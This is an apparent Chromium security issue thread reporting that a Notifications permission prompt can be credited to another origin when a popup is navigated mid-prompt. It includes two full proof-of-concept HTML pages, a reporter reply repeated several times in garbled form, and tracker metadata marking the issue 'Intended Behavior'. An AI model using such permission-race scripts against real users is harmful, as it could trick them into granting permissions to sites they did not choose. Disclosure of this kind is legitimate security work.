@@ -1,0 +1,201 @@
+Issue ID: 458248112
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Chrome: Notifications permission prompt misattribution — popup opened on localhost then navigated to 127.0.0.1; “Allow” grants permission to attacker origin (127.0.0.1).</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p><a href="https://chromium.googlesource.com/chromium/src" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1V71JIJTuZ7EYiKAGQHXug">https://chromium.googlesource.com/chromium/src</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>Summary
+Notifications permission prompt misattribution. A popup is opened on localhost, which triggers the Notifications permission prompt. While the prompt is pending, the popup is navigated to 127.0.0.1. Pressing Allow grants the permission to 127.0.0.1 (attacker origin) instead of the original localhost that initiated the prompt. Minimal localhost PoC reliably reproduces.</p>
+<p>Environment
+Chrome 142.0.7444.60 (Stable), Windows 11 24H2 (Build 26100.689)
+Clean profile (--user-data-dir), no extensions/flags
+Expected
+The permission decision must be attributed to the origin that initiated the prompt (localhost), or the prompt should be cancelled on navigation.</p>
+<p>Actual
+After navigating the prompt-holding popup to 127.0.0.1, pressing Allow results in Notification.permission === &quot;granted&quot; on the attacker origin (127.0.0.1). Page log shows:
+after: Notification.permission on attacker = granted ⇒ MISATTRIBUTION (PWNED).</p>
+<p>Steps to Reproduce
+Serve these two files on 127.0.0.1:8000.
+Open <a href="http://127.0.0.1:8000/attacker_perm.html" data-b-widget="url" data-b-original-href="http://127.0.0.1:8000/attacker_perm.html" data-b-redirected-href="https://www.google.com/url?q=http://127.0.0.1:8000/attacker_perm.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1dsDLY3hYUUmVIUVBXMfXe">http://127.0.0.1:8000/attacker_perm.html</a> in a clean Chrome profile.
+Click Start. A popup to <a href="http://localhost:8000/perm_victim.html" data-b-widget="url" data-b-original-href="http://localhost:8000/perm_victim.html" data-b-redirected-href="https://www.google.com/url?q=http://localhost:8000/perm_victim.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3gIyFIAHazCK-66RqBvJQb">http://localhost:8000/perm_victim.html</a> will request Notifications after ~700ms.</p>
+<p>The attacker page navigates the popup to <a href="http://127.0.0.1:8000/perm_victim.html" data-b-widget="url" data-b-original-href="http://127.0.0.1:8000/perm_victim.html" data-b-redirected-href="https://www.google.com/url?q=http://127.0.0.1:8000/perm_victim.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0aprMy5CRXsFWWLWz90JoJ">http://127.0.0.1:8000/perm_victim.html</a> while the prompt is open.
+Click Allow on the prompt.
+Observe that Notification.permission becomes &quot;granted&quot; on 127.0.0.1 (attacker).</p>
+<p>PoC (attached as two separate HTML files)
+attacker_perm.html
+&lt;!doctype html&gt;<span>&lt;meta charset=&quot;utf-8&quot;&gt;</span></p>
+<div>&lt;title&gt;attacker — permission misattribution probe&lt;/title&gt;
+&lt;pre id=&quot;log&quot;&gt;ready… (current origin: &lt;span id=&quot;o&quot;&gt;&lt;/span&gt;)&lt;/pre&gt;
+&lt;script&gt;
+document.getElementById(&#39;o&#39;).textContent = location.origin;
+const log=(...a)=&gt;{const L=document.getElementById(&#39;log&#39;);L.textContent+=&#39;\n&#39;+a.join(&#39; &#39;)};
+document.addEventListener(&#39;click&#39;, async ()=&gt;{
+  log(&#39;before: Notification.permission on attacker =&#39;, Notification.permission);
+  const w = window.open(&#39;http://localhost:8000/perm_victim.html&#39;,&#39;perm&#39;,&#39;noopener=false&#39;);
+  if(!w){ log(&#39;popup blocked&#39;); return; }
+  setTimeout(()=&gt;{ try{ w.location.href=&#39;http://127.0.0.1:8000/perm_victim.html&#39;; }catch(e){} }, 350);
+  log(&#39;NOW: when the prompt appears, press Allow…&#39;);
+  const until = performance.now()+12000;
+  let granted=false;
+  while(performance.now()&lt;until){
+    if(Notification.permission===&#39;granted&#39;){ granted=true; break; }
+    await new Promise(r=&gt;setTimeout(r,200));
+  }
+  log(&#39;after: Notification.permission on attacker =&#39;, Notification.permission,
+      granted ? &#39;⇒ MISATTRIBUTION (PWNED)&#39; : &#39;⇒ no change (expected)&#39;);
+});
+&lt;/script&gt;
+</div>
+<p>perm_victim.html
+&lt;!doctype html&gt;<span>&lt;meta charset=&quot;utf-8&quot;&gt;</span></p>
+<div>&lt;title&gt;perm_victim (localhost)&lt;/title&gt;
+&lt;h3&gt;Victim (localhost) will request Notifications after 700ms…&lt;/h3&gt;
+&lt;script&gt;
+setTimeout(async ()=&gt;{
+  try{
+    const res = await Notification.requestPermission();
+    if(res === &#39;granted&#39;){ new Notification(&#39;Granted to: &#39; + location.origin); }
+  }catch(e){}
+}, 700);
+&lt;/script&gt;
+</div>
+<p>Impact
+Permissions Bypass / Security UI misattribution. An attacker origin can obtain Notifications permission (and potentially other prompt-based permissions under similar flows) by racing a cross-origin navigation during the prompt, enabling unwanted notification spam and erosion of the origin security model.</p>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>Who can exploit: Any web attacker controlling a site the user visits (or a malicious ad/widget) that can open a popup and trigger a Notifications prompt.</p>
+<p>What they gain: By navigating the prompt-holding popup to a different origin mid-prompt, the attacker’s origin receives Notifications permission. This enables unsolicited notification spam, social-engineering, and abuse of trust (permission appears to belong to the attacker’s site).</p>
+<p>Why it matters: This is a Permissions Bypass / Security UI misattribution that breaks the origin attribution model for browser prompts.</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Chrome 142.0.7444.60 (Stable) – Repro: 1/1 OS: Windows 11 Version 24H2 (Build 26100.689) Profile: clean (--user-data-dir), no extensions/flags</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Permissions Bypass</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Yuval Fradkin</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: yu...@gmail.com
+Chrome: Notifications permission prompt misattribution — popup opened on localhost then navigated to 127.0.0.1; “Allow” grants permission to attacker origin (127.0.0.1).
+
+Author: yu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: yu...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: ma...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ma...@google.com
+googlers_unrestricted
+
+Author: ma...@google.com
+TUdWbVl6RXpOR1F6T0dFeVpHSXpaREkwT0RJMllUSmpaREEzWTJZNU5ETT0=
+
+Author: ma...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: yu...@gmail.com
+Thanks for the update. Clarification: <a href="https://www.google.com/url?q=http://localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1T6dwSZmFfiNblFwLPp9A7" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://localhost" data-b-redirected-href="https://www.google.com/url?q=http://localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1T6dwSZmFfiNblFwLPp9A7">http://localhost</a> and <a href="https://www.google.com/url?q=http://127.0.0.1&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw38WG9gyqW2AGs4YH7hZUIo" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://127.0.0.1" data-b-redirected-href="https://www.google.com/url?q=http://127.0.0.1&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw38WG9gyqW2AGs4YH7hZUIo">http://127.0.0.1</a><br>are *different hosts* and therefore *different origins* (origin = scheme +<br>host + port). Notification permissions are origin-scoped.<br><br>In my PoC, a popup opens on localhost and is immediately navigated to<br>127.0.0.1. Clicking *Allow* ends up granting the permission to 127.0.0.1,<br>even though the user interaction was initiated by localhost. This<br>creates a *permission<br>laundering / confused-deputy* situation: the requesting UI is presented by<br>one origin while the grant is recorded for another origin after navigation.<br><br>Could you please confirm whether Chrome intentionally binds the permission<br>to the origin *at the moment of the click* (after navigation) rather than<br>to the origin that *initiated* the request? If this is by spec, I&#39;d<br>appreciate a precise reference. If not, consider:<br><br>   1.<br><br>   Binding the grant to the origin that initiated the request; or<br>   2.<br><br>   Freezing navigation of the requesting window while the prompt is open; or<br>   3.<br><br>   Updating the prompt to clearly show the *exact origin* that will receive<br>   the permission at click time.<br><br>*Notes:*<br><br>   -<br><br>   While both hosts resolve to loopback, they can front different local<br>   services; the risk is primarily *UX/permission misattribution*, not<br>   cross-network compromise.<br>   -<br><br>   The essence here is preventing user confusion and ensuring origin<br>   integrity for permission grants.<br><br><br><br>&lt;<a href="https://www.google.com/url?q=https://chatgpt.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw059d8QlAw_ZPyv1Nd1hGMn" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://chatgpt.com/" data-b-redirected-href="https://www.google.com/url?q=https://chatgpt.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw059d8QlAw_ZPyv1Nd1hGMn">https://chatgpt.com/</a>&gt;<br><br>lic Trackers &gt; 1362134 &gt; Chromium<br>
+
+Author: Thanks for the update. Clarification: http://localhost and http://127.0.0.1
+are *different hosts* and therefore *different origins* (origin = scheme +
+host + port). Notification permissions are origin-scoped.
+
+In my PoC, a popup opens on localhost and is immediately navigated to
+127.0.0.1. Clicking *Allow* ends up granting the permission to 127.0.0.1,
+even though the user interaction was initiated by localhost. This
+creates a *permission
+laundering / confused-deputy* situation: the requesting UI is presented by
+one origin while the grant is recorded for another origin after navigation.
+
+Could you please confirm whether Chrome intentionally binds the permission
+to the origin *at the moment of the click* (after navigation) rather than
+to the origin that *initiated* the request? If this is by spec, I'd
+appreciate a precise reference. If not, consider:
+
+   1.
+
+   Binding the grant to the origin that initiated the request; or
+   2.
+
+   Freezing navigation of the requesting window while the prompt is open; or
+   3.
+
+   Updating the prompt to clearly show the *exact origin* that will receive
+   the permission at click time.
+
+*Notes:*
+
+   -
+
+   While both hosts resolve to loopback, they can front different local
+   services; the risk is primarily *UX/permission misattribution*, not
+   cross-network compromise.
+   -
+
+   The essence here is preventing user confusion and ensuring origin
+   integrity for permission grants.
+
+
+
+<https://chatgpt.com/>
+
+lic Trackers > 1362134 > Chromium
+> <https://issues.chromium.org/components/1363614>
+> status:  Intended Behavior
+> reporter:  yuvalfradkin@gmail.com
+> cc:  ma...@google.com, yuvalfradkin@gmail.com
+> collaborators:  se...@chromium.org
+> type:  Vulnerability
+> access level:  Limited visibility
+> priority:  P4
+> severity:  S4
+> hotlist:  external_security_report
+> <https://issues.chromium.org/hotlists/5433527>
+> retention:  Component default
+>
+>
+> Generated by Google IssueTracker notification system.
+>
+> You're receiving this email because you have the following role(s) on the
+> issue: cc, reporter
+> Unsubscribe from this issue
+> <https://issues.chromium.org/issues/458248112?unsubscribe=true>.
+>
+Thanks for the update. Clarification: <a href="https://www.google.com/url?q=http://localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1T6dwSZmFfiNblFwLPp9A7" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://localhost" data-b-redirected-href="https://www.google.com/url?q=http://localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1T6dwSZmFfiNblFwLPp9A7">http://localhost</a> and <a href="https://www.google.com/url?q=http://127.0.0.1&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw38WG9gyqW2AGs4YH7hZUIo" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://127.0.0.1" data-b-redirected-href="https://www.google.com/url?q=http://127.0.0.1&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw38WG9gyqW2AGs4YH7hZUIo">http://127.0.0.1</a><br>are *different hosts* and therefore *different origins* (origin = scheme +<br>host + port). Notification permissions are origin-scoped.<br><br>In my PoC, a popup opens on localhost and is immediately navigated to<br>127.0.0.1. Clicking *Allow* ends up granting the permission to 127.0.0.1,<br>even though the user interaction was initiated by localhost. This<br>creates a *permission<br>laundering / confused-deputy* situation: the requesting UI is presented by<br>one origin while the grant is recorded for another origin after navigation.<br><br>Could you please confirm whether Chrome intentionally binds the permission<br>to the origin *at the moment of the click* (after navigation) rather than<br>to the origin that *initiated* the request? If this is by spec, I&#39;d<br>appreciate a precise reference. If not, consider:<br><br>   1.<br><br>   Binding the grant to the origin that initiated the request; or<br>   2.<br><br>   Freezing navigation of the requesting window while the prompt is open; or<br>   3.<br><br>   Updating the prompt to clearly show the *exact origin* that will receive<br>   the permission at click time.<br><br>*Notes:*<br><br>   -<br><br>   While both hosts resolve to loopback, they can front different local<br>   services; the risk is primarily *UX/permission misattribution*, not<br>   cross-network compromise.<br>   -<br><br>   The essence here is preventing user confusion and ensuring origin<br>   integrity for permission grants.<br><br><br><br>&lt;<a href="https://www.google.com/url?q=https://chatgpt.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw059d8QlAw_ZPyv1Nd1hGMn" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://chatgpt.com/" data-b-redirected-href="https://www.google.com/url?q=https://chatgpt.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw059d8QlAw_ZPyv1Nd1hGMn">https://chatgpt.com/</a>&gt;<br><br>lic Trackers &gt; 1362134 &gt; Chromium<br>
+
+Author: &gt; &lt;https://issues.chromium.org/components/1363614&gt;<br>&gt; status:  Intended Behavior<br>&gt; reporter:  yuvalfradkin@gmail.com<br>&gt; cc:  ma...@google.com, yuvalfradkin@gmail.com<br>&gt; collaborators:  se...@chromium.org<br>&gt; type:  Vulnerability<br>&gt; access level:  Limited visibility<br>&gt; priority:  P4<br>&gt; severity:  S4<br>&gt; hotlist:  external_security_report<br>&gt; &lt;https://issues.chromium.org/hotlists/5433527&gt;<br>&gt; retention:  Component default<br>&gt;<br>&gt;<br>&gt; Generated by Google IssueTracker notification system.<br>&gt;<br>&gt; You&#39;re receiving this email because you have the following role(s) on the<br>&gt; issue: cc, reporter<br>&gt; Unsubscribe from this issue<br>&gt; &lt;https://issues.chromium.org/issues/458248112?unsubscribe=true&gt;.<br>&gt;<br>
+Thanks for the update. Clarification: <a href="https://www.google.com/url?q=http://localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1T6dwSZmFfiNblFwLPp9A7" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://localhost" data-b-redirected-href="https://www.google.com/url?q=http://localhost&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1T6dwSZmFfiNblFwLPp9A7">http://localhost</a> and <a href="https://www.google.com/url?q=http://127.0.0.1&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw38WG9gyqW2AGs4YH7hZUIo" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://127.0.0.1" data-b-redirected-href="https://www.google.com/url?q=http://127.0.0.1&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw38WG9gyqW2AGs4YH7hZUIo">http://127.0.0.1</a><br>are *different hosts* and therefore *different origins* (origin = scheme +<br>host + port). Notification permissions are origin-scoped.<br><br>In my PoC, a popup opens on localhost and is immediately navigated to<br>127.0.0.1. Clicking *Allow* ends up granting the permission to 127.0.0.1,<br>even though the user interaction was initiated by localhost. This<br>creates a *permission<br>laundering / confused-deputy* situation: the requesting UI is presented by<br>one origin while the grant is recorded for another origin after navigation.<br><br>Could you please confirm whether Chrome intentionally binds the permission<br>to the origin *at the moment of the click* (after navigation) rather than<br>to the origin that *initiated* the request? If this is by spec, I&#39;d<br>appreciate a precise reference. If not, consider:<br><br>   1.<br><br>   Binding the grant to the origin that initiated the request; or<br>   2.<br><br>   Freezing navigation of the requesting window while the prompt is open; or<br>   3.<br><br>   Updating the prompt to clearly show the *exact origin* that will receive<br>   the permission at click time.<br><br>*Notes:*<br><br>   -<br><br>   While both hosts resolve to loopback, they can front different local<br>   services; the risk is primarily *UX/permission misattribution*, not<br>   cross-network compromise.<br>   -<br><br>   The essence here is preventing user confusion and ensuring origin<br>   integrity for permission grants.<br><br><br><br>&lt;<a href="https://www.google.com/url?q=https://chatgpt.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw059d8QlAw_ZPyv1Nd1hGMn" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://chatgpt.com/" data-b-redirected-href="https://www.google.com/url?q=https://chatgpt.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw059d8QlAw_ZPyv1Nd1hGMn">https://chatgpt.com/</a>&gt;<br><br>lic Trackers &gt; 1362134 &gt; Chromium<br>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
